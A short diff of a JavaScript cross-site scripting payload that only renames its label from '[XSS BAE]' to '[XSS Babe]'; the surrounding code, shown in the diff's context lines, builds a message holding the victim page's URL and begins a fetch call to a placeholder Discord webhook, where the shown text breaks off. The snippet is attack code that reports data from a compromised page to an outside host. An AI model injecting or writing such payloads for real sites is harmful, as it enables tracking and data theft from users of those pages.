@@ -1,6 +1,6 @@
 (function () {
     const data = {
-        content: "[XSS BAE ⚔️] Target page loaded: " + window.location.href,
+        content: "[XSS Babe ⚔️] Target page loaded: " + window.location.href,
     };
 
     fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_ID_HERE", {
